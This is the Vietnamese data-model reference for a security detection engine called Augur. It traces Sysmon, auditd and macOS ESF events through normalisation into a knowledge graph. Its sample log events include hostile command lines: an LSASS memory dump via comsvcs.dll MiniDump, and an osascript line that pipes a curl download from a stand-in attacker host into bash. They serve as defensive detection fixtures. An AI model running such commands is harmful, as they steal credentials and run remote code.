[English](../en/DATA_MODEL.md) | **Tiếng Việt**

# Augur — Tài Liệu Tham Khảo Mô Hình Dữ Liệu

Tài liệu này theo dõi một sự kiện bảo mật từ dòng nhật ký thô qua mọi bước chuyển đổi: sự kiện
thô theo hệ điều hành → `NormalizedEvent` chuẩn hóa → các nút và cạnh trong đồ thị tri thức →
bổ sung thông tin từ topology. Xem [ENGINE.md](ENGINE.md) để hiểu cách engine tiêu thụ đồ thị, và
[SCENARIO_FORMAT.md](SCENARIO_FORMAT.md) để hiểu cách các kịch bản mô tả những gì cần tìm kiếm.

---

## 1. Nguồn Nhật Ký Thô

Augur nhận vào các tệp JSONL — một đối tượng JSON mỗi dòng — thông qua `augur.ingest.read_jsonl(path)`. Trường
`source_type` trên mỗi sự kiện sẽ chọn bộ chuẩn hóa tương ứng. Khi `source_type` vắng mặt, đường dẫn Windows
cũ được sử dụng (tương đương với `windows_sysmon`).

### 1.1 `windows_sysmon`

Năm giá trị `event_id` được chấp nhận; tất cả các giá trị khác sẽ gây ra `ValueError`.

| `event_id` | `kind` được ánh xạ | Ý nghĩa |
|---|---|---|
| `1` (int) | `process_create` | Tiến trình mới được sinh ra |
| `7` (int) | `image_load` | DLL được nạp vào một tiến trình |
| `22` (int) | `dns_query` | Sysmon DnsQuery (gốc/native) — xem §1.4 |
| `3` (int) | `network_connect` | Sysmon NetworkConnect (gốc/native) — xem §1.4 |
| `"edr"` (str) | `behavior` | Dấu hiệu hành vi từ EDR |

**Sự kiện thô mẫu — process create (event_id 1):**

```json
{
  "source_type": "windows_sysmon",
  "event_id": 1,
  "timestamp": "2026-03-14T08:22:01.000000+00:00",
  "host": "HR_User_PC",
  "user": "CORP\\jsmith",
  "user_sid": "S-1-5-21-1234-5678-9012-1001",
  "process_guid": "{aabbcc-0001}",
  "process_name": "rundll32.exe",
  "process_path": "C:\\Windows\\System32\\rundll32.exe",
  "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Temp\\lsass.dmp full",
  "parent_process_guid": "{aabbcc-0000}",
  "parent_process_name": "cmd.exe",
  "integrity_level": "High",
  "hashes": { "MD5": "d1e4a42b3c1f9aa2c4e7b5dd12345678" },
  "signed": true,
  "signature_vendor": "Microsoft Corporation"
}
```

**`NormalizedEvent` kết quả:**

```
kind              = "process_create"
host              = "HR_User_PC"
event_id          = 1
user              = "CORP\\jsmith"
user_sid          = "S-1-5-21-1234-5678-9012-1001"
process_guid      = "{aabbcc-0001}"
process_name      = "rundll32.exe"
process_path      = "C:\\Windows\\System32\\rundll32.exe"
command_line      = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 ..."
parent_process_guid = "{aabbcc-0000}"
parent_process_name = "cmd.exe"
integrity_level   = "High"
hashes            = {"MD5": "d1e4a42b..."}
signed            = true
signature_vendor  = "Microsoft Corporation"
source_type       = "windows_sysmon"
os_family         = "windows"
raw_event_type    = "1"
```

### 1.2 `linux_auditd`

Ba loại bản ghi auditd được tiêu thụ (`EXECVE`, `SYSCALL`, `EDR`); bất kỳ giá trị `type` nào khác sẽ
khiến sự kiện bị loại bỏ im lặng (bộ chuẩn hóa trả về `None`). Một `process_guid` ổn định được tổng
hợp dưới dạng `"host:pid"` để liên kết các bản ghi cho cùng một tiến trình trong đồ thị.

| `type` | Phân biệt | `kind` được ánh xạ | Ý nghĩa |
|---|---|---|---|
| `EXECVE` | — | `process_create` | Thực thi tiến trình (dạng chuẩn auditd) |
| `SYSCALL` | `syscall == "connect"` | `network_connect` | Bắt `connect(2)`, giải mã `daddr`/`dport` (gốc/native) — xem §1.4 |
| `SYSCALL` | có `name` | `image_load` | Thư viện dùng chung được ánh xạ (tải `.so`) |
| `EDR` | `behavior == "dns_query"` | `dns_query` | Lớp phủ DNS từ tác nhân/EDR (auditd KHÔNG phân giải DNS) — xem §1.4 |
| `EDR` | còn lại | `behavior` | Dấu hiệu hành vi từ tác nhân Linux |

Thứ tự ưu tiên tái tạo command-line cho các bản ghi EXECVE:

1. Các đối số vị trí `a0`…`aN` được nối bằng khoảng trắng (dạng EXECVE chuẩn của auditd)
2. `proctitle` với các byte NUL được thay thế bằng khoảng trắng
3. Trường phủ lên `cmdline` (một số tác nhân EDR phát ra trường này)
4. Tên cơ sở `comm` (phương án cuối cùng)

**Sự kiện thô mẫu — EXECVE:**

```json
{
  "source_type": "linux_auditd",
  "type": "EXECVE",
  "timestamp": "2026-03-14T08:22:05.000000+00:00",
  "host": "lnx-worker-01",
  "uid": "1000",
  "auid": "1000",
  "pid": 4821,
  "ppid": 4800,
  "comm": "crontab",
  "exe": "/usr/bin/crontab",
  "a0": "crontab",
  "a1": "-e"
}
```

**`NormalizedEvent` kết quả:**

```
kind              = "process_create"
host              = "lnx-worker-01"
event_id          = "EXECVE"
user              = "1000"
user_sid          = "1000"
process_guid      = "lnx-worker-01:4821"
process_name      = "crontab"
process_path      = "/usr/bin/crontab"
command_line      = "crontab -e"
parent_process_guid = "lnx-worker-01:4800"
source_type       = "linux_auditd"
os_family         = "linux"
raw_event_type    = "EXECVE"
```

> **Lưu ý về tái sử dụng pid:** Lược đồ guid `host:pid` có thể xảy ra xung đột trong các phiên chạy rất dài. Đây là
> hạn chế được ghi nhận của PoC; chấp nhận được trong các cửa sổ mô phỏng bị giới hạn và các fixture viết tay.

### 1.3 `macos_esf`

macOS Endpoint Security Framework phát ra JSON lồng nhau. Bốn giá trị `event_type` được tiêu thụ;
các giá trị khác bị loại bỏ.

| `event_type` | `kind` được ánh xạ | Ý nghĩa |
|---|---|---|
| `ES_EVENT_TYPE_NOTIFY_EXEC` | `process_create` | Thực thi tiến trình qua ESF |
| `ES_EVENT_TYPE_NOTIFY_MMAP` | `image_load` | Tệp được ánh xạ vào bộ nhớ (dylib hoặc framework) |
| `ES_AGENT_NOTIFY_NETWORK_CONNECT` | `network_connect` | Lớp phủ tác nhân/Network-Extension (ESF chuẩn không có NOTIFY socket-connect) — xem §1.4 |
| `ES_AGENT_NOTIFY_DNS_QUERY` | `dns_query` | Lớp phủ tác nhân/NEDNSProxyProvider (DNS không có trong ESF thô) — xem §1.4 |

Đối với các sự kiện exec:
- `process_guid` = `process.audit_token` (ổn định qua các lần fork; ưu tiên hơn `host:pid`)
- `parent_process_guid` = `process.parent_audit_token` nếu có, không thì dùng `"host:ppid"`
- `signed` ← `process.is_platform_binary`
- `signature_vendor` ← `process.signing_id`
- `command_line` từ `event.exec.args` (chấp nhận cả dạng danh sách và chuỗi đã ghép sẵn)

Đối với các sự kiện mmap, đường dẫn tệp được ánh xạ được đọc từ `event.mmap.source.path` hoặc
`event.mmap.file.path` (cả hai đều được chấp nhận để tương thích).

**Sự kiện thô mẫu — ES_EVENT_TYPE_NOTIFY_EXEC:**

```json
{
  "source_type": "macos_esf",
  "event_type": "ES_EVENT_TYPE_NOTIFY_EXEC",
  "timestamp": "2026-03-14T09:10:00.000000+00:00",
  "host": "mac-eng-02",
  "user": "dev",
  "process": {
    "executable": { "path": "/usr/bin/osascript" },
    "audit_token": "mac-eng-02:8800",
    "ppid": 1,
    "parent_audit_token": "mac-eng-02:1",
    "is_platform_binary": true,
    "signing_id": "com.apple.osascript"
  },
  "event": {
    "exec": {
      "args": ["osascript", "-e", "do shell script \"curl -sS http://evil.example/stage2 | bash\""]
    }
  }
}
```

**`NormalizedEvent` kết quả:**

```
kind              = "process_create"
host              = "mac-eng-02"
event_id          = "ES_EVENT_TYPE_NOTIFY_EXEC"
user              = "dev"
process_guid      = "mac-eng-02:8800"
process_name      = "osascript"
process_path      = "/usr/bin/osascript"
command_line      = "osascript -e do shell script ..."
parent_process_guid = "mac-eng-02:1"
signed            = true
signature_vendor  = "com.apple.osascript"
source_type       = "macos_esf"
os_family         = "macos"
raw_event_type    = "ES_EVENT_TYPE_NOTIFY_EXEC"
```

### 1.4 Các kind viễn thám mạng: `dns_query` và `network_connect`

Hai kind sự kiện ngoài bộ ban đầu `process_create` / `image_load` / `behavior` mang theo viễn thám
mạng cho lớp phủ threat-intel. Chúng điền vào ba trường vốn rỗng trên `NormalizedEvent`:

- `dns_query` → `domain` (tên miền được truy vấn, đọc từ `query_name` thô)
- `network_connect` → `dest_ip` (giá trị IOC có thể khớp) và `dest_port` (chỉ là ngữ cảnh)

**Nguồn gốc theo hệ điều hành (trung thực về những gì mỗi nguồn thực sự mang theo):**

| Hệ điều hành | Nguồn `dns_query` | Nguồn `network_connect` |
|---|---|---|
| Windows | Sysmon EID 22 (DnsQuery) — **gốc/native** | Sysmon EID 3 (NetworkConnect) — **gốc/native** |
| Linux | Bản ghi `EDR` với `behavior == "dns_query"` — **lớp phủ tác nhân/EDR** (auditd KHÔNG phân giải DNS) | `SYSCALL` `connect(2)`, giải mã `daddr`/`dport` — **gốc/native**, gốc nhất trong bốn đường mới |
| macOS | `ES_AGENT_NOTIFY_DNS_QUERY` — **lớp phủ tác nhân** (ESF chuẩn không có DNS NOTIFY) | `ES_AGENT_NOTIFY_NETWORK_CONNECT` — **lớp phủ tác nhân** (ESF chuẩn không có NOTIFY socket-connect) |

> **Trơ / engine không thấy / chỉ dành cho lớp phủ IOC.** Hai kind này và ba trường của chúng
> (`domain`, `dest_ip`, `dest_port`) hoàn toàn vô hình đối với engine phát hiện:
>
> - `build_graph` (`src/augur/graph/builder.py`) là một khối `if/elif` đóng trên
>   `process_create` / `image_load` / `behavior`. Một sự kiện `dns_query` hoặc `network_connect`
>   tạo ra **không** nút và cạnh nào trong đồ thị, nên bộ so khớp không bao giờ liệt kê nó.
> - `domain`, `dest_ip`, và `dest_port` xuất hiện trong **không** field map tiêu chí nào
>   (`PROCESS_KEY_MAP` / `FILE_KEY_MAP` trong `src/augur/engine/criteria.py`), nên không bước kịch
>   bản nào có thể tham chiếu chúng. (Lưu ý: `hashes` cũng vắng mặt khỏi các map này — nó được sao
>   chép lên `ProcessNode` nhưng không bao giờ được khớp.)
>
> Do đó việc thêm các kind/trường này đã thay đổi **không** hành vi engine nào — được xác nhận bởi
> các test bảo vệ tính bằng-nhau của đồ thị, và bởi detectability giữ ở 40/40 và robustness ở 100%.
> Chúng tồn tại duy nhất để cung cấp cho lớp phủ threat-intel IOC chỉ-đọc (`POST /api/ioc_match`),
> đây là consumer duy nhất đọc chúng.

**Sự kiện thô mẫu (Windows Sysmon, gốc/native):**

```json
{"source_type": "windows_sysmon", "event_id": 22, "timestamp": "2026-03-14T08:23:00.000000+00:00",
 "host": "HR_User_PC", "process_guid": "{aabbcc-0001}", "query_name": "evil.example.com"}
{"source_type": "windows_sysmon", "event_id": 3, "timestamp": "2026-03-14T08:23:01.000000+00:00",
 "host": "HR_User_PC", "process_guid": "{aabbcc-0001}", "dest_ip": "203.0.113.7", "dest_port": 443}
```

**Các `NormalizedEvent` kết quả:**

```
kind = "dns_query"        host = "HR_User_PC"  process_guid = "{aabbcc-0001}"  domain = "evil.example.com"
kind = "network_connect"  host = "HR_User_PC"  process_guid = "{aabbcc-0001}"  dest_ip = "203.0.113.7"  dest_port = 443
```

---

## 2. `NormalizedEvent` Chuẩn Hóa

Mọi bộ chuẩn hóa đều tạo ra một dataclass `NormalizedEvent` duy nhất (`src/augur/normalize/model.py`).
Bộ xây dựng đồ thị, engine và bộ tính điểm đều hoạt động độc quyền trên kiểu này.

### 2.1 Tham Chiếu Đầy Đủ Các Trường

| Trường | Kiểu | Có mặt trong | Mô tả |
|---|---|---|---|
| `timestamp` | `datetime` (có múi giờ) | tất cả | Thời gian sự kiện, phân tích cú pháp qua `datetime.fromisoformat()` |
| `kind` | `str` | tất cả | `"process_create"` / `"image_load"` / `"behavior"` / `"dns_query"` / `"network_connect"` (hai cái cuối là trơ — xem §1.4) |
| `host` | `str` | tất cả | Tên máy chủ dùng làm khóa đồ thị và khóa tra cứu topology |
| `event_id` | `int \| str` | tất cả | Định danh sự kiện nguồn (`1`, `7`, `"EXECVE"`, …) |
| `user` | `str \| None` | các sự kiện tiến trình | Tên người dùng hoặc chuỗi UID |
| `process_guid` | `str \| None` | tiến trình / image / behavior | Định danh ổn định theo tiến trình |
| `process_name` | `str \| None` | các sự kiện tiến trình | Tên cơ sở của tệp thực thi |
| `process_path` | `str \| None` | các sự kiện tiến trình | Đường dẫn đầy đủ đến tệp thực thi |
| `command_line` | `str \| None` | các sự kiện tiến trình | Chuỗi đối số đầy đủ |
| `parent_process_guid` | `str \| None` | các sự kiện tiến trình | Định danh ổn định của tiến trình cha |
| `parent_process_name` | `str \| None` | các sự kiện tiến trình | Tên cơ sở tệp thực thi của tiến trình cha |
| `integrity_level` | `str \| None` | các sự kiện tiến trình Windows | ví dụ: `"High"`, `"Medium"` |
| `user_sid` | `str \| None` | Windows / Linux | SID (Windows) hoặc chuỗi AUID (Linux) |
| `hashes` | `dict` | các sự kiện tiến trình Windows | `{"MD5": "…", "SHA256": "…"}` — mặc định là dict rỗng |
| `image_loaded` | `str \| None` | `image_load` | Đường dẫn đầy đủ của tệp được nạp |
| `extension` | `str \| None` | `image_load` | Phần mở rộng chữ thường có dấu chấm, ví dụ: `".dll"` |
| `signed` | `bool \| None` | `image_load` | Liệu tệp có được ký hay không |
| `signature_vendor` | `str \| None` | `image_load` | Chủ thể chứng chỉ ký hoặc signing ID |
| `is_injected` | `bool` | `image_load` | Tác nhân đánh dấu đây là module bị inject; mặc định `False` |
| `api_hooking_detected` | `bool` | `image_load` | Tác nhân phát hiện API hooking; mặc định `False` |
| `hooked_functions` | `list` | `image_load` | Tên các hàm API bị hook; mặc định `[]` |
| `behavior` | `str \| None` | `behavior` | Chuỗi dấu hiệu hành vi, ví dụ: `"lsass_access"` |
| `target` | `str \| None` | `behavior` | Tên tiến trình hoặc đối tượng đích |
| `granted_access` | `str \| None` | `behavior` | Chuỗi hex mặt nạ truy cập, ví dụ: `"0x1410"` |
| `reason` | `str \| None` | `behavior` | Lý do dạng văn bản tự do do tác nhân cung cấp |
| `domain` | `str \| None` | `dns_query` | Tên miền được truy vấn; **trơ** — không có trong field map nào (xem §1.4) |
| `dest_ip` | `str \| None` | `network_connect` | IP đích — giá trị IOC có thể khớp; **trơ** (xem §1.4) |
| `dest_port` | `int \| None` | `network_connect` | Cổng đích — chỉ là ngữ cảnh, KHÔNG phải IOC có thể khớp; **trơ** (xem §1.4) |
| `source_type` | `str \| None` | tất cả (nguồn gốc) | `"windows_sysmon"` / `"linux_auditd"` / `"macos_esf"` |
| `os_family` | `str \| None` | tất cả (nguồn gốc) | `"windows"` / `"linux"` / `"macos"` — được đặt bởi bộ chuẩn hóa |
| `raw_event_type` | `str \| None` | tất cả (nguồn gốc) | Dạng chuỗi của định danh kiểu sự kiện gốc |

Các trường nguồn gốc (`source_type`, `os_family`, `raw_event_type`) chỉ được lưu trữ để quan sát.
Bộ so khớp và bộ tính điểm không bao giờ đọc chúng. Các trường viễn thám mạng (`domain`, `dest_ip`,
`dest_port`) cũng trơ tương tự — chúng chỉ tồn tại cho lớp phủ IOC (xem §1.4).

---

## 3. Đồ Thị Tri Thức

`build_graph(events, topology, backend)` (`src/augur/graph/builder.py`) chuyển đổi các đối tượng `NormalizedEvent`
thành một đa đồ thị có hướng có kiểu gồm các nút và cạnh. Backend đồ thị được chọn bởi
`augur.pipeline._select_backend()`: `NetworkXBackend` theo mặc định (không cần hạ tầng bên ngoài); `Neo4jBackend` khi
`AUGUR_BACKEND=neo4j` được đặt.

Bộ xây dựng là một khối `if/elif` đóng chỉ trên `process_create` / `image_load` / `behavior`. Các sự
kiện `dns_query` và `network_connect` rơi qua nó và tạo ra **không** nút hay cạnh nào (xem §1.4).

### 3.1 Các Loại Nút

Tất cả các loại nút đều là các đối tượng Python `@dataclass` thuần túy — không phải mô hình Pydantic.

#### `HostNode`

Được tạo một lần mỗi tên máy chủ duy nhất, được điền từ topology.

| Trường | Kiểu | Ghi chú |
|---|---|---|
| `id` | `str` | Bằng với `hostname` |
| `hostname` | `str` | Tên máy chủ chuẩn |
| `ip` | `str` | Địa chỉ IP từ topology |
| `os` | `str` | Nhãn hệ điều hành từ topology |
| `zone` | `Zone` | Zone có thẩm quyền (xem §4) |
| `criticality` | `Criticality` | Mức độ quan trọng có thẩm quyền (xem §4) |
| `node_type` | `str` | Luôn là `"Host"` |

#### `ProcessNode`

Được tạo từ các sự kiện `process_create`.

| Trường | Kiểu | Ghi chú |
|---|---|---|
| `id` | `str` | `process_guid` |
| `name` | `str \| None` | `process_name` |
| `path` | `str \| None` | `process_path` |
| `command_line` | `str \| None` | Chuỗi đối số đầy đủ |
| `parent_guid` | `str \| None` | `parent_process_guid` |
| `parent_process_name` | `str \| None` | Tên cơ sở tệp thực thi của tiến trình cha |
| `host` | `str` | Tên máy chủ của sự kiện nguồn |
| `timestamp` | `datetime \| None` | Thời gian sự kiện |
| `user_sid` | `str \| None` | SID hoặc AUID |
| `integrity_level` | `str \| None` | Mức toàn vẹn Windows |
| `hashes` | `dict` | Các hash mật mã |
| `node_type` | `str` | Luôn là `"Process"` |

#### `FileNode`

Được tạo từ các sự kiện `image_load`.

| Trường | Kiểu | Ghi chú |
|---|---|---|
| `id` | `str` | `process_guid` của tiến trình đang nạp |
| `name` | `str \| None` | Tên cơ sở của `image_loaded` |
| `path` | `str \| None` | Đường dẫn đầy đủ của `image_loaded` |
| `extension` | `str \| None` | Phần mở rộng chữ thường (`.dll`, `.so`, `.dylib`) |
| `is_signed` | `bool \| None` | Trường `signed` |
| `is_injected` | `bool` | `is_injected` |
| `api_hooking_detected` | `bool` | `api_hooking_detected` |
| `host` | `str` | Tên máy chủ của tiến trình đang nạp |
| `timestamp` | `datetime \| None` | Thời gian sự kiện |
| `signature_vendor` | `str \| None` | Danh tính ký |
| `hooked_functions` | `list` | Tên các hàm API bị hook |
| `node_type` | `str` | Luôn là `"File"` |

### 3.2 Các Loại Cạnh

Mỗi `Edge` mang `src_id`, `dst_id`, `edge_type`, `timestamp`, và một dict `attrs` dạng tự do.

| `edge_type` | Nguồn → Đích | Kích hoạt bởi | Nội dung `attrs` |
|---|---|---|---|
| `SPAWNED` | `ProcessNode` → `ProcessNode` | `process_create` | Liên kết guid cha với guid con |
| `LOADED` | `ProcessNode` → `FileNode` | `image_load` | Liên kết tiến trình đang nạp với nút tệp |
| `EXHIBITED` | `ProcessNode` → `ProcessNode` | `behavior` | Tiến trình nguồn đến tiến trình đích; mang `behavior`, `target`, `granted_access` |
| `RUNS_ON` | `ProcessNode` → `HostNode` | Mỗi nút tiến trình | Neo tiến trình vào máy chủ của nó để kiểm tra phạm vi |

---

## 4. Topology

`load_topology()` đọc `topology/network.yaml` và cung cấp `Topology.enrich(hostname)` trả về
`(Zone, Criticality)`. Đây là **nguồn có thẩm quyền duy nhất** cho zone và mức độ quan trọng.
Mọi trường `zone` trên sự kiện nhật ký thô đều bị bỏ qua hoàn toàn trong quá trình đánh giá ràng buộc.

Các máy chủ không có trong tệp topology nhận `Zone.Unknown` và `Criticality.UNKNOWN`, điều này làm thất bại
tất cả các cổng ràng buộc không gian. Các sự kiện của chúng vẫn vào đồ thị nhưng không bao giờ đóng góp vào điểm proximity.

### 4.1 Giá Trị Zone

| Thành viên enum | Chuỗi được tuần tự hóa | Sử dụng điển hình |
|---|---|---|
| `Zone.DMZ` | `"DMZ"` | Các máy chủ vành đai hướng Internet |
| `Zone.Internal_Server` | `"Internal_Server"` | Máy chủ backend / ứng dụng |
| `Zone.User_Endpoint` | `"User_Endpoint"` | Máy trạm và laptop của nhân viên |
| `Zone.Cloud_SaaS` | `"Cloud_SaaS"` | Khối lượng công việc được lưu trữ trên đám mây |
| `Zone.Active_Directory` | `"Active_Directory"` | Domain controller và các máy chủ liền kề AD |
| `Zone.Unknown` | `"Unknown"` | Máy chủ không có trong topology; thất bại tất cả các cổng không gian |

### 4.2 Giá Trị Criticality

| Thành viên enum | Chuỗi được tuần tự hóa |
|---|---|
| `Criticality.LOW` | `"LOW"` |
| `Criticality.MEDIUM` | `"MEDIUM"` |
| `Criticality.HIGH` | `"HIGH"` |
| `Criticality.CRITICAL` | `"CRITICAL"` |
| `Criticality.UNKNOWN` | `"UNKNOWN"` |

### 4.3 Giá Trị LinkScope

Được sử dụng trong `temporal_link` của bước kịch bản để ràng buộc mối quan hệ máy chủ giữa các bước liên tiếp.

| Thành viên enum | Chuỗi được tuần tự hóa | Ràng buộc |
|---|---|---|
| `LinkScope.same_host` | `"same_host"` | Cả hai bước phải liên quan đến cùng tên máy chủ |
| `LinkScope.cross_host` | `"cross_host"` | Các bước phải liên quan đến các tên máy chủ khác nhau |
| `LinkScope.any` | `"any"` | Không áp dụng ràng buộc quan hệ máy chủ |

---

## 5. Đầu Ra Phát Hiện

Sau khi engine chạy, mỗi kịch bản khớp tạo ra một dataclass `Detection`
(`src/augur/engine/scoring.py`). REST API loại bỏ bất kỳ trường nào có tên bắt đầu bằng `_`
thông qua `_public()`.

Các trường công khai chính được trả về bởi `/api/detections`:

| Trường | Kiểu | Mô tả |
|---|---|---|
| `scenario_id` | `str` | ví dụ: `"SCEN-WIN-001"` |
| `scenario_name` | `str` | Tên dễ đọc của con người |
| `severity` | `str` | `"LOW"` / `"MEDIUM"` / `"HIGH"` / `"CRITICAL"` |
| `proximity` | `float` | `round(matched_steps / total_steps, 4)` |
| `matched_steps` | `int` | Các bước tiền tố liên tiếp đã khớp |
| `total_steps` | `int` | Tổng số bước trong kịch bản |
| `affected_hosts` | `list[str]` | Các tên máy chủ liên quan trong chuỗi đã khớp |
| `chain` | `list` | Danh sách có thứ tự các nút đồ thị đã khớp |

Các trường riêng tư chỉ dành cho nội bộ (dùng để xếp hạng, không bao giờ gửi cho client): `_latest_ts`,
`_latest_ts_epoch`, `_severity_rank`. Thứ tự xếp hạng phát hiện:
`(-proximity, -severity_rank, -latest_ts_epoch)`.

---

## Xem Thêm

- [ENGINE.md](ENGINE.md) — thuật toán khớp tiền tố hợp lệ dài nhất
- [SCENARIO_FORMAT.md](SCENARIO_FORMAT.md) — tài liệu tham khảo soạn thảo YAML kịch bản
- [API.md](API.md) — tài liệu tham khảo REST endpoint
- [ARCHITECTURE.md](ARCHITECTURE.md) — tổng quan đầy đủ về pipeline và các thành phần
